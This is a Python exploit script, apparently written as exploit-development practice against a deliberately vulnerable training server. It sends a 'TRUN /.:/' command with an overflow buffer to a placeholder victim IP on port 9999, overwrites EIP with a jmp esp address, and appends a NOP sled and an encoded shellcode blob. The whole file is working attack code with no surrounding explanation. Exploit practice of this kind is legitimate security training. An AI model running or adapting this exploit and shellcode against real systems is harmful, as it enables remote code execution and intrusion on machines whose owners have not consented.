#!/usr/bin/env python
import socket 
import struct
   ## Check for bad characters ##
#all_characters = b"".join([struct.pack("<B",x) for x in range(1,256)])
#print (all_characters)

s = socket.socket()
s.connect(("<VICTIM_IP>", 9999))
total_length = 2984
initial_length = 2003
eip_addr = 0x62501203  #should be conv to little endian
new_eip = struct.pack("<I" , 0x62501203) #jmp esp
#new_eip = "\x03\x12\x50\x62"

nop_sled = b"\x90"*16


buf =  b""
buf += b"\xdd\xc6\xbf\xa6\xbd\x69\x98\xd9\x74\x24\xf4\x5e\x29"
buf += b"\xc9\xb1\x59\x83\xee\xfc\x31\x7e\x15\x03\x7e\x15\x44"
buf += b"\x48\x95\x70\x07\xb3\x66\x81\x77\x85\xb4\x08\x92\x81"
buf += b"\xb3\x59\x6c\xc1\x96\x51\x07\x87\x02\x5b\xe8\xa3\x59"
buf += b"\xb3\x19\x03\xd7\xe5\x14\xab\x44\xd5\x37\x57\x97\x0a"
buf += b"\x97\x66\x58\x5f\xd6\xaf\x2e\x15\x37\x7d\x3a\x87\xd7"
buf += b"\x09\x7e\x14\x80\x0c\xaf\xef\x6e\x77\xca\x30\x1a\xcb"
buf += b"\xd5\x60\xb2\x58\x9d\x98\xb9\x07\x3e\x98\x6e\x32\xf7"
buf += b"\xee\xac\x0c\xf7\x46\x47\x5a\x8c\x58\x81\x92\x52\x9b"
buf += b"\xe2\xd8\xfe\x1d\x3b\xda\x1e\x68\x37\x18\xa2\x6b\x8c"
buf += b"\x62\x78\xf9\x12\xc4\x0b\x59\xf6\xf4\xd8\x3c\x7d\xfa"
buf += b"\x95\x4b\xd9\x1f\x2b\x9f\x52\x1b\xa0\x1e\xb4\xad\xf2"
buf += b"\x04\x10\xf5\xa1\x25\x01\x53\x07\x59\x51\x3b\xf8\xff"
buf += b"\x1a\xae\xef\x80\xe3\x30\x10\xdd\x73\xfc\xdd\xde\x83"
buf += b"\x6a\x55\xac\xb1\x35\xcd\x3a\xf9\xbe\xcb\xbd\x88\xa9"
buf += b"\xeb\x12\x32\xb9\x15\x93\x42\x93\xd1\xc7\x12\x8b\xf0"
buf += b"\x67\xf9\x4b\xfc\xbd\x97\x41\x6a\xfe\xcf\x5c\xea\x96"
buf += b"\x0d\x61\xff\xd5\x98\x87\xaf\x49\xca\x17\x10\x3a\xaa"
buf += b"\xc7\xf8\x50\x25\x37\x18\x5b\xec\x50\xb3\xb4\x58\x08"
buf += b"\x2c\x2c\xc1\xc2\xcd\xb1\xdc\xae\xce\x3a\xd4\x4f\x80"
buf += b"\xca\x9d\x43\xf5\xac\x5d\x9c\x06\x59\x5d\xf6\x02\xcb"
buf += b"\x0a\x6e\x09\x2a\x7c\x31\xf2\x19\xff\x36\x0c\xdc\xc9"
buf += b"\x4d\x3b\x4a\x75\x3a\x44\x9a\x75\xba\x12\xf0\x75\xd2"
buf += b"\xc2\xa0\x26\xc7\x0c\x7d\x5b\x54\x99\x7e\x0d\x08\x0a"
buf += b"\x17\xb3\x77\x7c\xb8\x4c\x52\xfe\xbf\xb2\x20\x29\x18"
buf += b"\xda\xda\x69\x98\x1a\xb1\x69\xc8\x72\x4e\x45\xe7\xb2"
buf += b"\xaf\x4c\xa0\xda\x3a\x01\x02\x7b\x3a\x08\xc2\x25\x3b"
buf += b"\xbf\xdf\xd6\x46\xb0\xe0\x17\xb7\xd8\x84\x18\xb7\xe4"
buf += b"\xba\x25\x61\xdd\xc8\x68\xb1\x5a\xc2\xdf\x94\xcb\x49"
buf += b"\x1f\x8a\x0c\x58"
shellcode = buf


payload = [
    b"TRUN /.:/",
    b"A"*initial_length,
    new_eip,
    nop_sled,
    shellcode,
    b"C"*(total_length - initial_length - len(new_eip)- len(nop_sled)- len(shellcode))
]

payload = b"".join(payload)
#print (payload)
s.send(payload)
s.close()




#0x009BF1F0
#0x009BFD98
#2984
